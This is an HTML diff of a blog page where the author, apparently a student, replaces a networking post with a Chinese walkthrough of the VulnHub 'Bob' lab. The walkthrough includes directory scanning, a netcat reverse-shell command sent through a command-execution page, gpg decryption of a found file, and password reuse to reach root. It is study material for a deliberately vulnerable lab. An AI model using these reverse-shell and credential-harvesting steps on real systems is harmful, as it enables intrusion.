@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="单臂路由和ICMP协议, C,Pyhton,Linux">
+    <meta name="keywords" content="vulnhub-Bob, C,Pyhton,Linux">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>单臂路由和ICMP协议 | lemon-fan</title>
+    <title>vulnhub-Bob | lemon-fan</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/14.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/libs/awesome/css/all.css">
@@ -306,12 +306,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">单臂路由和ICMP协议</h1>
+                    <h1 class="description center-align post-title">vulnhub-Bob</h1>
                 </div>
             </div>
         </div>
@@ -445,6 +445,15 @@
                 </div>
                 <div class="col s5 right-align">
                     
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
+                                web渗透
+                            </a>
+                        
+                    </div>
+                    
                 </div>
             </div>
 
@@ -452,21 +461,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-09-18
+                    2020-11-27
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-18
+                    2020-11-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    798
+                    756
                 </div>
                 
 
@@ -489,16 +498,13 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <a id="more"></a>
-
-<h1 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h1><p>我们在设置好vlan之后如果连接同一台交换机的PC在不同的vlan之中是没有办法进行通信的（相当于处于不同的vlan的PC是处于不同的局域网），这样一来我就需要用到单臂路由（虽然现在被淘汰了），单臂路由的具体实现是在原本的路由器的接口处分生出子接口而不同的vlan则连接不同的子接口，而实现不同vlan之间的通信就需要用到这些子接口，具体过程为：在vlan2中的一台PC想要同vlan3中的一台PC进行通信的话在数据帧经过交换机之后会传到路由器，再从路由器的借口接收到数据帧之后会对所收数据帧在判断所属是哪一个vlan之后会将数据帧传输到该vlan的子接口，然后子接口在对所收数据帧进行解封装之后在根据路由表进行路由转发，也就是说每一个子接口就相当于一台路由器，而我们原本的物理路由器就是这些“路由器”的集合，由于将整体的抽象图画出之后根据图像从而称之为单臂路由（本人自己猜测）。</p>
-<p>具体的单臂路由配置过程我就不在这里说了，每一个牌子的路由器的命令有所不同，需要自己去把路由器的命令手册dang下来自己研究。</p>
-<h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>我们通常ping其他PC时所用的协议你可能会认为是强大的TCP协议，但实际上真正实现这个功能的是ICMP协议，ICMP协议属于是TCP/IP五层协议的第三层，且ICMP协议没有具体的端口号，ICMP协议具体用处为：1.网络探测 2.路由跟踪 3.错误反馈。ICMP协议数据的封装格式为：ICMP头+数据，而ICMP头中的则为ICMP类型+代码。其中，数据这一板块芝士味确认你收到了这个包，其中的内容都是些无意义的数据。而ICMP类型则是为了表现出你返回的ICMP包是什么类型，例如：是正常回包还是错误回包。而之后的类型则是为了表现出错误回包是什么类型。如果你的返回包不是错误的ICMP类型的值会与代码的值相同。</p>
-<h2 id="几种ICMP类型的说明"><a href="#几种ICMP类型的说明" class="headerlink" title="几种ICMP类型的说明"></a>几种ICMP类型的说明</h2><p>ICMP的类型值有很多我接下来只说明几种：</p>
-<p>1.若类型值为8则是ping请求包。</p>
-<p>2.若类型值为0则为ping应答包。</p>
-<p>3.若类型值为3则为目标主机不可达的错误回包，也就是这种类型的ICMP包之后的代码值会与类型值不同，而不同的代码值对应不同的回包。</p>
-<p>4.若类型值为11则为TTL超时的数据包，这种回包可用于路由追踪（可以返回ping的过程中所经历的路由器IP地址）。而实现路由追踪的命令Windows为: tracert+IP地址       Linux为：traceroute+IP地址</p>
+                <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2020/11/27/vulnhub-Bob/1.png" alt><br>靶机开放了80和21端口（我全程下来都没有利用过这个端口），打开80界面发现就一张图片，其余什么也没有，<br><img src="/2020/11/27/vulnhub-Bob/2.png" alt><br>所以就dirb一下网站的文件目录<br><img src="/2020/11/27/vulnhub-Bob/3.png" alt><br>发现了敏感文件robots.txt，访问发现是四个页面，逐一访问在/dev_shell.php页面发现了一些有用的东西<br><img src="/2020/11/27/vulnhub-Bob/4.png" alt></p>
+<h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>我们发现/dev_shell.php是一个命令执行的页面，所以这就就是我们拿到shell的一个点，在这里我利用了普通的反弹shell，发现并没有什么用，所以就去看了别人的wp，发现这里对我们输入语句做了比较严格的限制，找了半天找到了一个能用到的反弹shell语句</p>
+<pre class=" language-shell"><code class="language-shell">/bin/nc -e /bin/sh 192.168.10.207 7744    //反弹shell语句</code></pre>
+<p>kali监听端口之后就到了我们接下来的提权阶段<br><img src="/2020/11/27/vulnhub-Bob/5.png" alt><br><img src="/2020/11/27/vulnhub-Bob/6.png" alt></p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>我们暂时的用户为www-data，su一下发现并没有什么可提权的点，系统版本也找不到相关的漏洞，直接去根目录下看看发现了flag.txt文件，但是我们没有权限（很肏），所以就去别的用户目录下看看有没有什么可以利用的信息，这里我们可以联想一下最初的时候web页面的介绍，提示我们注意Documents，所以就看一下每个用户的Documents目录，在bob用户的Documents目录看到了一些我们感兴趣的东西。<br><img src="/2020/11/27/vulnhub-Bob/7.png" alt><br>这里的login.txt.gpg文件我在开始做的时候觉得很奇怪，在我双看了别人的wp之后发现此文件是一个被加密过的文件，但是我们没有密码，翻了一下staff.txt文件，看了看之后发没觉得有什么发现，然后使劲翻Secret文件终于发现了一个有用的东西<br><img src="/2020/11/27/vulnhub-Bob/8.png" alt><br>起先我没看懂这是什么，所以就叒看了别人的wp，发现这是一个藏头诗，将头部聚集起来就是harpocrates的大写，也就是我们之前看到的被加密过的文件的密码，本来我挺高兴的去解密结果发现自己不会解密命令，所以就叕去看了别人的wp，解密命令如下</p>
+<pre class=" language-shell"><code class="language-shell">gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</code></pre>
+<p>但是我们没有权限（很肏），<br><img src="/2020/11/27/vulnhub-Bob/12.png" alt><br>于是就只能到其他用户目录下看看有没有能用的信息，然后我们在elliot目录下发现了一个文档<br><img src="/2020/11/27/vulnhub-Bob/9.png" alt><br>发现了james的密码，su一下（james的用户名叫jc），只时候我们再到bob的Documents目录下看看能不能解密刚才那个文件，发现成功<br><img src="/2020/11/27/vulnhub-Bob/10.png" alt><br>发现了bob用户的密码，直接su一手，只时候我想到了那个在根目录下的flag.txt文件，看一看这次有没有权限打开，最后成功拿到flag（我也不知道为什么要用sudo命令）<br><img src="/2020/11/27/vulnhub-Bob/11.png" alt></p>
 
             </div>
             <hr/>
@@ -524,7 +530,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://lemon-fan.github.io/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/">http://lemon-fan.github.io/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/</a>
+                    <a href="http://lemon-fan.github.io/2020/11/27/vulnhub-Bob/">http://lemon-fan.github.io/2020/11/27/vulnhub-Bob/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -626,33 +632,30 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/">
+                <a href="/2020/11/27/vulnhub-Bob/">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/6.jpg" class="responsive-img" alt="vulnhub中的wordpress靶场">
+                        <img src="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/20.jpg" class="responsive-img" alt="vulnhub-Bob">
                         
-                        <span class="card-title">vulnhub中的wordpress靶场</span>
+                        <span class="card-title">vulnhub-Bob</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-
-
-
-vulnhub的介绍最近刚开始学习web渗透，也搭建了一个vulnhub的靶场，在这里我介绍一下vulnhub靶场，这是一个公开的免费的web渗透靶场，我们在选好相关目标靶场之后下载靶场的相关压缩文件，解压后直接在虚拟机中打开就可以
+                            信息收集靶机开放了80和21端口（我全程下来都没有利用过这个端口），打开80界面发现就一张图片，其余什么也没有，所以就dirb一下网站的文件目录发现了敏感文件robots.txt，访问发现是四个页面，逐一访问在/dev_shell.php页
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-10-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -665,6 +668,7 @@ vulnhub的介绍最近刚开始学习web渗透，也搭建了一个vulnhub的靶
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -683,31 +687,33 @@ vulnhub的介绍最近刚开始学习web渗透，也搭建了一个vulnhub的靶
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/">
+                <a href="/2020/11/25/vulnhub-Lampiao/">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/22.jpg" class="responsive-img" alt="vlan的了解">
+                        <img src="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/22.jpg" class="responsive-img" alt="vulnhub-Lampiao">
                         
-                        <span class="card-title">vlan的了解</span>
+                        <span class="card-title">vulnhub-Lampiao</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-
-vlan产生的原因在局域网中，由于我们的PC会经常性的发送广播，例如ARP广播，交换机的广播等等，我们的PC对于广播会直接接收，如果广播的内容对于我们自身的PC无用则会被丢弃，而如果一个局域网中连接的PC数量较多的话我们的PC则会运行直
+                            信息收集扫描靶机IP，以及靶机的端口，此靶场的开放端口会有点特殊，只看到了22端口和8端口，打开80端口，发现什么也没有，觉得应该像之前的做过的靶场一样有端口我们没有扫描出来，所以我用nmap再次扫描发现了一个不一样的端口打开1898界面，
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-25
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            lemon-fan
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
+                                    web渗透
+                                </a>
+                            
                             
                         </span>
                     </div>
